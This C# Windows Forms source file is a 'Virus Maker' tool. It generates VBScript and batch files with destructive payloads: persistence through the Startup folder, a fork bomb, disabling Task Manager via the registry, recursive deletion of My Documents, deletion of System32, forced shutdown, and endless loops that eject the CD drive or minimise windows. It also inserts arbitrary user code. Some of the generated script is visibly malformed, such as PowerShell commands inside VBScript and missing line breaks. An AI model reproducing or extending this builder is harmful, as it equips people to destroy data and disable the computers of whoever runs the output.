using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace VirusMaker
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();

            string applicationDirectory = Application.StartupPath;
            saveLocation_Display.Text = applicationDirectory;
        }

        // GLOBALS
        string newLine = Environment.NewLine;

        // SAVE + DELETE BUTTONS
        private void saveLocationBtn_Click(object sender, EventArgs e)
        {
            try
            {
                FolderBrowserDialog selectFileDialog = new FolderBrowserDialog();
                DialogResult result = selectFileDialog.ShowDialog();
                string folderName = selectFileDialog.SelectedPath;

                if (result == DialogResult.OK)
                {
                    saveLocation_Display.Text = folderName;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                msgLog.Text += "An error occured." + newLine;
            }
        }

        private void dltLastSaveBtn_Click(object sender, EventArgs e)
        {
            string virusFilePathBatch = saveLocation_Display.Text + "\\" + virusName.Text + "_extra.bat";
            string virusFilePathVBS = saveLocation_Display.Text + "\\" + virusName.Text + ".vbs";

            try
            {
                if (virusName.Text.Trim().Length > 0)
                {
                    if (File.Exists(virusFilePathVBS))
                    {
                        System.IO.File.Delete(virusFilePathVBS);
                        msgLog.Text += virusName.Text + ".vbs successfully deleted." + newLine;
                    }
                    else if (File.Exists(virusFilePathVBS) == false)
                    {
                        MessageBox.Show(virusFilePathVBS + " doesn't exist.", "Unable to Delete", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        msgLog.Text += virusName.Text + ".vbs doesn't exist." + newLine;
                    }
                    if (File.Exists(virusFilePathBatch))
                    {
                        System.IO.File.Delete(virusFilePathBatch);
                        msgLog.Text += virusName.Text + "_extra.bat successfully deleted." + newLine;
                    }
                    else if (File.Exists(virusFilePathBatch) == false)
                    {
                        MessageBox.Show(virusFilePathBatch + " doesn't exist.", "Unable to Delete", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        msgLog.Text += virusName.Text + "_extra.bat doesn't exist." + newLine;
                    }
                }
                else if (virusName.Text.Trim().Length == 0)
                {
                    DialogResult result = MessageBox.Show("Please enter the name of a previous virus.", "Virus Name Null", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    if (result == DialogResult.OK)
                    {
                        virusName.Select();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                msgLog.Text += "An error occured." + newLine;
            }
        }

        // CREATE VIRUS BUTTON
        private void createVirusBtn_Click(object sender, EventArgs e)
        {
            // Check whether custom code box meets parameters
            bool customCodeCheck = false;
            if (customCodeLang.Text.ToUpper() == "VBSCRIPT" || customCodeLang.Text.ToUpper() == "BATCH")
            {
                customCodeCheck = true;
            }
            if (customCode.Text.Trim().Length > 0 && customCodeCheck == false)
            {
                    MessageBox.Show("Please make sure that you have selected either 'VBScript' or 'Batch' in the custom code section.", "Invalid Custom Code", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else // Main code
            {
                try
                {
                    string batchContentsMain = "REM Made with Virus Maker (Pre-Release v0.3)" + newLine + newLine + "@echo off" + newLine;
                    string batchContentsLoop = ":start" + newLine;

                    string vbsContentsMain = "'Made with Virus Maker (Pre-Release v0.3)" + newLine + newLine;

                    // Startup setup
                    if (copyToStartup_CB.Checked)
                    {
                        batchContentsMain += "REM Copy to startup" + newLine
                            + "copy \"" + virusName.Text + "_extra.bat\" \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\\"" + newLine
                            + "copy \"" + virusName.Text + ".vbs\" \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"" + newLine + newLine;
                        MessageBox.Show(batchContentsMain);
                    }

                    //  Just for fun group
                    if (swapMouseBtn_CB.Checked)
                    {
                        batchContentsMain += "REM Swap mouse buttons" + newLine
                            + "Rundll32 user32,SwapMouseButton";
                    }
                    if (openCloseCD_CB.Checked)
                    {
                        vbsContentsMain += "'-- Open/Close CD Drive --" + newLine
                            + "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" + newLine
                            + "Set colCDROMs = oWMP.cdromCollection" + newLine
                            + "if colCDROMs.Count >= 1 then" + newLine
                            + "do" + newLine
                            + "For i = 0 to colCDROMs.Count - 1" + newLine
                            + "colCDROMs.Item(i).Eject" + newLine
                            + "Next ' cdrom" + newLine
                            + "For i = 0 to colCDROMs.Count - 1" + newLine
                            + "colCDROMs.Item(i).Eject" + newLine
                            + "Next ' cdrom" + newLine
                            + "Loop" + newLine
                            + "End If" + newLine + newLine;
                    }
                    if (minimiseWindows_CB.Checked)
                    {
                        vbsContentsMain += "'-- Minimize all windows --" + newLine;
                        vbsContentsMain += "Do While true" + newLine
                            + "set objShell = CreateObject(\"shell.application\")" + newLine
                            + "objShell.ToggleDesktop" + newLine
                            + "Loop" + newLine + newLine;
                    }
                    if (bombDesktop_CB.Checked)
                    {
                        batchContentsLoop += "REM Fork bomb"
                            + "REM Fork bomb" + newLine
                            + "start %0" + newLine
                            + "%0|%0" + newLine;
                    }

                    // Harmful group
                    if (disableTaskMng_CB.Checked)
                    {
                        vbsContentsMain += "-- Disable Task Manager --"
                            + "Shell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr\", 1, \"REG_DWORD\""
                            + newLine + newLine;
                    }
                    if (dltMyDocuments_CB.Checked)
                    {
                        vbsContentsMain += "'-- Delete my documents --"
                            + "GET-CHILDITEM \"$HOME\\My Documents\" -recurse | Remove-ITEM" + newLine + newLine;
                    }
                    if (dltSystem32_CB.Checked)
                    {
                        vbsContentsMain += "'-- Delete System32 --"
                            + "Dim FSO, folder" + newLine
                            + "set shell = WScript.CreateObject(\"WScript.Shell\")" + newLine
                            + "folder = shell.ExpandEnvironmentStrings(\"%systemdir%\")" + newLine
                            + "set FSO = CreateObject(\"Scripting.FileSystemObject\")" + newLine
                            + "FSO.DeleteFolder(folder)" + newLine + newLine;
                    }

                    // Other options
                    if (shutdownComp_CB.Checked)
                    {
                        string shutdownWait = Convert.ToString(timeToWait_Value.Value);

                        vbsContentsMain += "'-- Shutdown computer --" + newLine
                            + "set objShell = CreateObject(\"WScript.Shell\")" + newLine
                            + "strShutdown = \"shutdown -s -t " + shutdownWait + " -f -m \"" + newLine
                            + "objShell.Run strShutdown" + newLine + newLine;
                        MessageBox.Show(vbsContentsMain);
                    }
                    if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "VBSCRIPT")
                    {
                        vbsContentsMain += "'-- Custom code --" + newLine
                            + customCode.Text + newLine;
                    }
                    else if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "BATCH")
                    {
                        batchContentsMain += "REM Custom code" + newLine
                            + customCode.Text + newLine;
                    }

                    batchContentsLoop += "goto start" + newLine;

                    // File creation
                    string finalBatchContents = batchContentsMain + batchContentsLoop; // merger of batch content

                    string vbsSavePath = saveLocation_Display.Text + "\\Virus Maker Output\\";
                    string batchSavePath = saveLocation_Display.Text + "\\Virus Maker Output\\";

                    if (virusName.Text.Trim().Length == 0 )
                    {
                        DialogResult result = MessageBox.Show("The virus name field is blank, do you wan the default name to be used?", "Virus Name Invalid", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                        if (result == DialogResult.Yes)
                        {
                            vbsSavePath += "myVirus.vbs";
                            batchSavePath += "myVirus_extra.bat";
                        }
                    }
                    else if (virusName.Text.Trim().Length > 0)
                    {
                        vbsSavePath += virusName.Text + ".vbs";
                        batchSavePath += virusName.Text + "_extra.bat";
                    }

                    // Folder exists check
                    string virusMakerFolder = saveLocation_Display.Text + "\\Virus Maker Output";
                    if (File.Exists(virusMakerFolder) == false)
                    {
                        System.IO.Directory.CreateDirectory(virusMakerFolder);
                    }

                    System.IO.StreamWriter vbsWriter;
                    vbsWriter = new System.IO.StreamWriter(vbsSavePath);
                    vbsWriter.Write(vbsContentsMain);
                    vbsWriter.Close();
                    
                    System.IO.StreamWriter batchWriter;
                    batchWriter = new System.IO.StreamWriter(batchSavePath);
                    batchWriter.Write(finalBatchContents);
                    batchWriter.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    msgLog.Text += "An error occured." + newLine;
                }
            }
            
        }
    }
}
